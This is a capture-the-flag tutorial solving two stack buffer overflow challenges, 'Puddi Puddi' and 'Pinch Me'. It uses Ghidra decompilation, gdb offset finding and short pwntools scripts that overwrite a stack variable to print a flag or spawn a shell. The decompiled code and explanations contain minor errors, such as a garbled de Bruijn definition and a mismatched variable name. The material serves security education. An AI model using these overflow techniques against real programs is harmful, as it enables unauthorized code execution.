---
title: Stack Buffer Overflow Practice Solutions
date: 0006-01-01T00:00:08Z
draft: false
description: nil
toc: false
---

Before you read the challenge solution below, you should have at least attempted the challenges in the [previous page](/pwn/stack/bof).

## WhiteHacks 2021 - Puddi Puddi

#### Overview

Decompiling the binary in Ghidra, we obtain the following decompiled code:

```c
void print_flag(void)

{
  FILE *__stream;
  size_t __nmemb;
  char *__s;
  char *flag;
  size_t data_size;
  FILE *file;

  flag = fopen("flag.txt","rb");
  if (flag == (FILE *)0x0) {
    puts("flag.txt not found!");
    exit(1);
  }

  return;
}

int main(void)

{
  int iVar1;
  char input [32];
  char size [5];

  size = 0x4147454d; // MEGA
  size[4] = '\0';

  printf("Do you like pudding? (Y/N) => ");
  scanf("&s", input);
  puts("PUDDI PUDDI!");
  sleep(1);
  puts("PUDDI PUDDI!");
  sleep(1);
  puts("SUGOKU DEKKAI...");
  sleep(1);
  iVar1 = strcmp(size,"GIGA");
  if (iVar1 != 0) {
    puts("Oops we ran out of pudding...");
    exit(1);
  }

  puts(gigabanner);

  print_flag();
  return 0;
}

```

This is a rather simple binary with a simple logic to follow:

1. It takes in an `input[32]` with `scanf("%s", input)` which does not limit the size of our input **vulnerable!!**
2. It compares `size[5] = MEGA` with `GIGA` in `strcmp(size, "GIGA")`.
3. If ``size[5] == GIGA``, it calls `print_flag()` which prints the flag.
4. If ``size[5] != GIGA``, it calls `exit(1)`, which exits the program immediately.

#### Thought Process

As you can see, `size[5] = 0x4147454d (MEGA in hex)` and `input[32]` was initialized at the start of the main function.

However, the program sets ``size[5] = MEGA``, and there is no function that allows us to modify `size[5]`.

Rightfully, we should **never** be able to write to `size[5]` and pass the check.

This is where buffer overflow comes in.

Our objective is to overflow the `input[32]` buffer to overwrite into `size[5]`.

#### Exploitation

Looking at the stack layout in Ghidra, we can easily calculate our offset.

![image](/lawofpwn/images/ghidrastackpuddi.png)

`0x38 - 0xd = 43`

Now we can craft our script:

```py
from pwn import * # import PwnTools Library

p = process('./puddi') # start process puddi
p.sendline("A"*43 + "GIGA") # send input to process
p.interactive() # manual control over process
```

If the flag successfully prints, you win!

<br><br>

## dCTF 2021 - Pinch Me

#### Overview
```c

void main(void)

{
  alarm(10);
  vuln();
  return 0;
}


void vuln(void)

{
  char input [24];
  int local_10;
  int objective;

  objective = 0x1234567;  // 0x1234567
  local_10 = -0x76543211; // 0x89abcdef

  puts("Is this a real life, or is it just a fanta sea?");
  puts("Am I dreaming?");

  fgets(input,100,stdin);
  if (local_10 == 0x1337c0de) {
    system("/bin/sh");
  }
  else {
    if (objective == 0x1234567) {
      puts("Pinch me!");
    }
    else {
      puts("Pinch me harder!");
    }
  }
  return;
}

```

Logic of this binary is simple

1. `main()` calls `vuln()`
2. `vuln()` initializes 3 variables, `input[24]`, `objective` and `local_10`.
3. `vuln()` takes in an input of size 100 with `fgets(input,100,stdin)`
4. If `objective == 0x1337c0de`, we get a shell.

#### Thought Process

So once again, we are allowed to input 100 bytes into a 24 byte variable, giving us a buffer overflow.

And our objective is to make `objective == 0x1337c0de` in order to obtain shell.

We can easily achieve this with a BOF exploit.

#### Exploitation

Instead of looking at the stack in Ghidra this time, let's do this in our debugger, GDB.

First, we open the binary with GDB

``gdb <binary>``

We can see our assembly instructions by disassembling functions

``disassemble vuln``

```asm
0x0000000000401193 <+65>:       call   0x401060 <fgets@plt>
0x0000000000401198 <+70>:       cmp    DWORD PTR [rbp-0x8],0x1337c0de
0x000000000040119f <+77>:       jne    0x4011af <vuln+93>
```

We want to break after our input at `vuln +70` with

`break *vuln+70`

After setting our breakpoint, we run the program.

``run``

We key in an input with different characters after every 4 byte.

`1111222233334444555566667777888899990000`

This is known as a de brujin sequence.

> A de Bruijn sequence with is a binary sequence of length 2k such that every consecutive sequence of 2k digits appears exactly once in the whole sequence.

After our input, we immediately hit our breakpoint, which we previously set after our input.

We can now examine what is being compared against `0x1337c0de` in the binary.

Simply do `x $rbp-0x8` since the assembly is comparing `[rbp-0x8], 0x1337c0de`.

```asm
pwndbg> x $rbp-0x8
0x7fffffffe518: 0x37373737
```

We see that `0x37373737` is being compared against `0x1337c0de`.

`0x37373737` is hex for `7777`. This means that our buffer is actually `6*4=24`.

With our offset, we can write our script.

However, you have to understand that binaries actually store `integers` in `little-endian` format.

> Little-endian is an order in which the "little end" (least significant value in the sequence) is stored first.

This means that we have to reverse the bytes of `0x1337c0de` after our 24-byte buffer.

Thankfully, PwnTools got us covered, with `p32()` and `p64()` which allows us to pack our integers into `32-bit little-endian` and `64-bit little-endian`. Respectively.

```py
p = process('./pinch_me')

p.sendline(b"A"*24 + p64(0x1337c0de))
p.interactive()
```

If you popped a shell from the binary, you win!

